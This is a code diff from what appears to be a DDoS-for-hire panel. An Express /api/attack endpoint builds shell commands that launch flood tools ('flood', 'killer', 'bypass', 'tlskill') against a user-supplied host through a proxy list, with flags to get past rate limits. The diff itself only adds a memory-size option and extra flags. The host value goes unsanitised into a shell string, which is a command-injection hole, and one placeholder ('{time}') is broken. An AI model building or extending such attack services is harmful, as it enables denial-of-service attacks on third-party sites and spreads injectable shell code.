@@ -55,19 +55,19 @@ app.get("/api/attack", (req, res) => {
   let command = "";
   switch (method.toLowerCase()) {
     case "flood":
-      command = `node flood ${host} ${time} 10 10 live.txt flood`;
+      command = `node --max-old-space-size=65536 flood ${host} ${time} 10 10 live.txt flood`;
       break;
     case "killer":
-      command = `node killer GET ${host} ${time} 10 10 live.txt`;
+      command = `node --max-old-space-size=65536 killer GET ${host} ${time} 10 10 live.txt`;
       break;
     case "bypass":
-      command = `node bypass ${host} ${time} 10 10 live.txt bypass --redirect true --ratelimit true --query true`;
+      command = `node --max-old-space-size=65536 bypass ${host} ${time} 10 10 live.txt bypass --redirect true --ratelimit true --query true`;
       break;
     case "tlskill":
-      command = `node tlskill ${host} ${time} 10 10 live.txt tlskill`;
+      command = `node --max-old-space-size=65536 tlskill ${host} ${time} 10 10 live.txt --icecool true --dual true --brave true`;
       break;
     case "priv":
-      command = `node -m GET -u ${host} -s {time} -p live.txt --ratelimit true --full true`;
+      command = `node --max-old-space-size=65536 -m GET -u ${host} -s {time} -p live.txt --ratelimit true --full true`;
       break;
   }
 
